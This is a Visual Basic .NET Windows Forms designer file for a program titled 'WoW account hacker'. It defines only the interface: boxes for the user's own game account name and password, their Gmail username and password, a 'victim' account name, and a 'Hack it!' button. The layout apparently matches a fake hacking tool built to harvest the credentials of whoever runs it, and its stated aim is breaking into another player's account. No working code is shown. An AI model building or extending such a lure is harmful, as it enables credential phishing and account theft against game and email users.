<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
        Me.GroupBox1 = New System.Windows.Forms.GroupBox
        Me.user1pass = New System.Windows.Forms.TextBox
        Me.Label2 = New System.Windows.Forms.Label
        Me.Label3 = New System.Windows.Forms.Label
        Me.user1name = New System.Windows.Forms.TextBox
        Me.Label1 = New System.Windows.Forms.Label
        Me.GroupBox2 = New System.Windows.Forms.GroupBox
        Me.Label6 = New System.Windows.Forms.Label
        Me.Label4 = New System.Windows.Forms.Label
        Me.victimname = New System.Windows.Forms.TextBox
        Me.GroupBox3 = New System.Windows.Forms.GroupBox
        Me.user1gmailpass = New System.Windows.Forms.TextBox
        Me.user1gmail = New System.Windows.Forms.TextBox
        Me.Label8 = New System.Windows.Forms.Label
        Me.Label7 = New System.Windows.Forms.Label
        Me.Label5 = New System.Windows.Forms.Label
        Me.About = New System.Windows.Forms.Button
        Me.hackit = New System.Windows.Forms.Button
        Me.PictureBox1 = New System.Windows.Forms.PictureBox
        Me.ProgressBar1 = New System.Windows.Forms.ProgressBar
        Me.GroupBox1.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'GroupBox1
        '
        Me.GroupBox1.BackColor = System.Drawing.SystemColors.ControlDark
        Me.GroupBox1.Controls.Add(Me.user1pass)
        Me.GroupBox1.Controls.Add(Me.Label2)
        Me.GroupBox1.Controls.Add(Me.Label3)
        Me.GroupBox1.Controls.Add(Me.user1name)
        Me.GroupBox1.Controls.Add(Me.Label1)
        Me.GroupBox1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.GroupBox1.Location = New System.Drawing.Point(6, 197)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(438, 110)
        Me.GroupBox1.TabIndex = 1
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Your user info"
        '
        'user1pass
        '
        Me.user1pass.Location = New System.Drawing.Point(172, 67)
        Me.user1pass.Name = "user1pass"
        Me.user1pass.Size = New System.Drawing.Size(251, 20)
        Me.user1pass.TabIndex = 2
        Me.user1pass.Text = "password"
        Me.user1pass.UseSystemPasswordChar = True
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(1, 16)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(363, 13)
        Me.Label2.TabIndex = 1
        Me.Label2.Text = "This information is used to log into the servers to hack your victims account."
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(39, 70)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(119, 13)
        Me.Label3.TabIndex = 3
        Me.Label3.Text = "Your account password"
        '
        'user1name
        '
        Me.user1name.Location = New System.Drawing.Point(172, 41)
        Me.user1name.Name = "user1name"
        Me.user1name.Size = New System.Drawing.Size(251, 20)
        Me.user1name.TabIndex = 1
        Me.user1name.Text = "Your account name"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(39, 44)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(100, 13)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "Your account name"
        '
        'GroupBox2
        '
        Me.GroupBox2.BackColor = System.Drawing.SystemColors.ControlDark
        Me.GroupBox2.Controls.Add(Me.Label6)
        Me.GroupBox2.Controls.Add(Me.Label4)
        Me.GroupBox2.Controls.Add(Me.victimname)
        Me.GroupBox2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.GroupBox2.Location = New System.Drawing.Point(6, 313)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(438, 86)
        Me.GroupBox2.TabIndex = 4
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Victim info"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Location = New System.Drawing.Point(39, 46)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(111, 13)
        Me.Label6.TabIndex = 0
        Me.Label6.Text = "Victims account name"
        '
        'Label4
        '
        Me.Label4.AutoSize = True
        Me.Label4.Location = New System.Drawing.Point(1, 16)
        Me.Label4.Name = "Label4"
        Me.Label4.Size = New System.Drawing.Size(275, 13)
        Me.Label4.TabIndex = 1
        Me.Label4.Text = "This information is the Victims account you want to hack."
        '
        'victimname
        '
        Me.victimname.Location = New System.Drawing.Point(172, 43)
        Me.victimname.Name = "victimname"
        Me.victimname.Size = New System.Drawing.Size(251, 20)
        Me.victimname.TabIndex = 3
        Me.victimname.Text = "Victims account name"
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.user1gmailpass)
        Me.GroupBox3.Controls.Add(Me.user1gmail)
        Me.GroupBox3.Controls.Add(Me.Label8)
        Me.GroupBox3.Controls.Add(Me.Label7)
        Me.GroupBox3.Controls.Add(Me.Label5)
        Me.GroupBox3.Location = New System.Drawing.Point(6, 406)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(438, 105)
        Me.GroupBox3.TabIndex = 5
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Your gmail info"
        '
        'user1gmailpass
        '
        Me.user1gmailpass.Location = New System.Drawing.Point(172, 71)
        Me.user1gmailpass.Name = "user1gmailpass"
        Me.user1gmailpass.Size = New System.Drawing.Size(251, 20)
        Me.user1gmailpass.TabIndex = 5
        Me.user1gmailpass.Text = "password"
        Me.user1gmailpass.UseSystemPasswordChar = True
        '
        'user1gmail
        '
        Me.user1gmail.Location = New System.Drawing.Point(172, 41)
        Me.user1gmail.Name = "user1gmail"
        Me.user1gmail.Size = New System.Drawing.Size(251, 20)
        Me.user1gmail.TabIndex = 4
        Me.user1gmail.Text = "Your gamil username"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Location = New System.Drawing.Point(39, 74)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(104, 13)
        Me.Label8.TabIndex = 2
        Me.Label8.Text = "Your gmail password"
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Location = New System.Drawing.Point(39, 41)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(105, 13)
        Me.Label7.TabIndex = 1
        Me.Label7.Text = "Your gmail username"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Location = New System.Drawing.Point(4, 20)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(338, 13)
        Me.Label5.TabIndex = 0
        Me.Label5.Text = "This information is used to email the password recovery options to you."
        '
        'About
        '
        Me.About.Location = New System.Drawing.Point(6, 517)
        Me.About.Name = "About"
        Me.About.Size = New System.Drawing.Size(75, 23)
        Me.About.TabIndex = 7
        Me.About.Text = "About"
        Me.About.UseVisualStyleBackColor = True
        '
        'hackit
        '
        Me.hackit.Location = New System.Drawing.Point(369, 518)
        Me.hackit.Name = "hackit"
        Me.hackit.Size = New System.Drawing.Size(75, 23)
        Me.hackit.TabIndex = 6
        Me.hackit.Text = "Hack it!"
        Me.hackit.UseVisualStyleBackColor = True
        '
        'PictureBox1
        '
        Me.PictureBox1.Image = Global.WoW_account_hacker.My.Resources.Resources.world_of_warcraft
        Me.PictureBox1.Location = New System.Drawing.Point(-7, 0)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(462, 191)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.AutoSize
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'ProgressBar1
        '
        Me.ProgressBar1.Location = New System.Drawing.Point(6, 546)
        Me.ProgressBar1.Name = "ProgressBar1"
        Me.ProgressBar1.Size = New System.Drawing.Size(438, 23)
        Me.ProgressBar1.TabIndex = 8
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.SystemColors.ControlDark
        Me.ClientSize = New System.Drawing.Size(454, 571)
        Me.Controls.Add(Me.ProgressBar1)
        Me.Controls.Add(Me.hackit)
        Me.Controls.Add(Me.About)
        Me.Controls.Add(Me.GroupBox3)
        Me.Controls.Add(Me.GroupBox2)
        Me.Controls.Add(Me.GroupBox1)
        Me.Controls.Add(Me.PictureBox1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "WoW account hacker"
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents Label4 As System.Windows.Forms.Label
    Friend WithEvents Label6 As System.Windows.Forms.Label
    Friend WithEvents victimname As System.Windows.Forms.TextBox
    Friend WithEvents user1pass As System.Windows.Forms.TextBox
    Friend WithEvents Label3 As System.Windows.Forms.Label
    Friend WithEvents user1name As System.Windows.Forms.TextBox
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents Label5 As System.Windows.Forms.Label
    Friend WithEvents user1gmailpass As System.Windows.Forms.TextBox
    Friend WithEvents user1gmail As System.Windows.Forms.TextBox
    Friend WithEvents Label8 As System.Windows.Forms.Label
    Friend WithEvents Label7 As System.Windows.Forms.Label
    Friend WithEvents About As System.Windows.Forms.Button
    Friend WithEvents hackit As System.Windows.Forms.Button
    Friend WithEvents ProgressBar1 As System.Windows.Forms.ProgressBar

End Class
